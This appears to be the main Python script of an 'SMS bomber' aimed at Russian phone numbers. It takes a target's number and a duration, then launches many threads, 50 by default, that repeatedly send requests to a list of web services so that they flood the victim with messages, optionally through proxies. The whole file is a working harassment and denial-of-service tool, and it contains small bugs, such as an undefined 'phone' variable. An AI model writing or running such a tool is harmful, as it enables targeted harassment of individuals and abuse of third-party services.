#!/usr/bin/python3

import json
import time
import random
from requests import exceptions
from itertools import cycle
from threading import Thread
from argparse import ArgumentParser
from service import Service
import conf.config as cfg


def flood(args, services):
    for service_info in cycle(random.sample(services, len(services))):
        if time.time() >= args.time:
            return 
        service = Service(service_info, args.timeout, args.proxy)
        service.parse_data()
        service.replace_data(args.phone)
        try:
            service.send_request()
            print(f"Success - {service.domain_name}")
        except exceptions.ReadTimeout:
            print(f"Fail - {service.domain_name} - ReadTimeout")
        except exceptions.ConnectTimeout:
            print(f"Fail - {service.domain_name} - ConnectTimeout")
        except exceptions.ConnectionError:
            print(f"Fail - {service.domain_name} - ConnectionError")
        except Exception as err:
            print(err) 
        except (KeyboardInterrupt, SystemExit):
            exit()

def main():
    # Creating parser obj
    parser = ArgumentParser(
        description="Sms bomber for russian phones"
    )
    parser.add_argument("-p", "--phone",
                        metavar="<phone-number>", type=str,
                        help="target's phone number, format no matters")
    parser.add_argument("-t", "--time",
                        metavar="<seconds>", type=float,
                        help="bombing time in seconds")
    parser.add_argument("--threads", default=50,
                        type=int, metavar="<num>",
                        help="bomber's threads count (default: %(default)s)")
    parser.add_argument("-T", "--timeout", default=3,
                        type=float, metavar="<seconds>",
                        help="request's timeout, (default: %(default)s)")
    parser.add_argument("--proxy", action="store_true", default=None,
                        help="use proxy from config.py file")
    parser.add_argument("--version", action="version",
                        version="%(prog)s " + cfg.__version__)
    
    args = parser.parse_args()
    
    # If user don't use phone and time parametrs 
    if not args.phone:
        args.phone = input("Enter target's phone number in any format: ")
    if not args.time:
        args.time = float(input("Enter bombing time in seconds: "))
    
    # Check proxy flag
    if args.proxy:
        args.proxy = cfg.proxies

    # Cleanup phone number
    for trash in ("'", '"', "_", "-", "(", ")", " ", "+"):
        if trash in args.phone:
            args.phone = args.phone.replace(trash, "")
    if args.phone[0] == "8":
        args.phone = "7" + phone[1::]
    if args.phone[0] == "9":
        args.phone = "7" + phone[1::]

    # Set stop time value
    args.time += time.time()

    # Load services list 
    with open("services.json", "r") as file:
        services = json.load(file)["services"]

    print(cfg.banner)    
    
    # Start threads 
    for thread in range(args.threads):
        Thread(target=flood, 
               args=(args, services, )
        ).start()


if __name__ == "__main__":
    main()
